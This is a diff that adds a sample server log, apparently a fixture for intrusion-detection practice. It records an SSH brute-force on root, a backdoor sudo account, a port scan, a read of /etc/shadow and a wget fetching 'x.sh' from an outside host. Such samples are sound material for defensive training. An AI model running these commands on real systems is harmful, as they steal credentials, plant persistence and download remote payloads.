@@ -1,0 +1,27 @@
+Oct  8 02:14:01 srv-web01 CRON[2210]: (root) CMD (/usr/local/bin/backup.sh)
+Oct  8 02:31:12 srv-web01 sshd[3101]: Failed password for root from 203.0.113.45 port 51122 ssh2
+Oct  8 02:31:14 srv-web01 sshd[3101]: Failed password for root from 203.0.113.45 port 51124 ssh2
+Oct  8 02:31:16 srv-web01 sshd[3101]: Failed password for root from 203.0.113.45 port 51126 ssh2
+Oct  8 02:31:18 srv-web01 sshd[3101]: Failed password for root from 203.0.113.45 port 51128 ssh2
+Oct  8 02:31:20 srv-web01 sshd[3101]: Failed password for root from 203.0.113.45 port 51130 ssh2
+Oct  8 02:31:22 srv-web01 sshd[3101]: Failed password for root from 203.0.113.45 port 51132 ssh2
+Oct  8 02:31:25 srv-web01 sshd[3101]: Accepted password for root from 203.0.113.45 port 51140 ssh2
+Oct  8 02:32:03 srv-web01 sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash support_tmp
+Oct  8 02:32:20 srv-web01 sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo support_tmp
+Oct  8 08:58:41 srv-web01 sshd[3377]: Accepted publickey for deploy from 10.0.5.12 port 40122 ssh2
+Oct  8 09:05:10 srv-web01 sshd[3402]: Accepted publickey for ivanov from 10.0.2.34 port 53311 ssh2
+Oct  8 09:12:44 srv-web01 sshd[3419]: Failed password for ivanov from 10.0.2.34 port 53390 ssh2
+Oct  8 09:12:51 srv-web01 sshd[3419]: Accepted password for ivanov from 10.0.2.34 port 53392 ssh2
+Oct  8 10:20:00 srv-web01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.7 DST=10.0.0.5 PROTO=TCP SPT=44000 DPT=21
+Oct  8 10:20:00 srv-web01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.7 DST=10.0.0.5 PROTO=TCP SPT=44001 DPT=22
+Oct  8 10:20:00 srv-web01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.7 DST=10.0.0.5 PROTO=TCP SPT=44002 DPT=23
+Oct  8 10:20:01 srv-web01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.7 DST=10.0.0.5 PROTO=TCP SPT=44003 DPT=25
+Oct  8 10:20:01 srv-web01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.7 DST=10.0.0.5 PROTO=TCP SPT=44004 DPT=80
+Oct  8 10:20:01 srv-web01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.7 DST=10.0.0.5 PROTO=TCP SPT=44005 DPT=110
+Oct  8 10:20:02 srv-web01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.7 DST=10.0.0.5 PROTO=TCP SPT=44006 DPT=443
+Oct  8 10:20:02 srv-web01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.7 DST=10.0.0.5 PROTO=TCP SPT=44007 DPT=445
+Oct  8 10:20:02 srv-web01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.7 DST=10.0.0.5 PROTO=TCP SPT=44008 DPT=3306
+Oct  8 10:20:03 srv-web01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.7 DST=10.0.0.5 PROTO=TCP SPT=44009 DPT=3389
+Oct  8 11:45:30 srv-web01 sudo:   ivanov : TTY=pts/1 ; PWD=/home/ivanov ; USER=root ; COMMAND=/usr/bin/apt update
+Oct  8 14:02:09 srv-web01 sudo: www-data : TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Oct  8 14:02:31 srv-web01 audit[5120]: USER_CMD uid=33 auid=4294967295 (www-data) cmd="wget http://198.51.100.200/x.sh -O /tmp/x.sh"
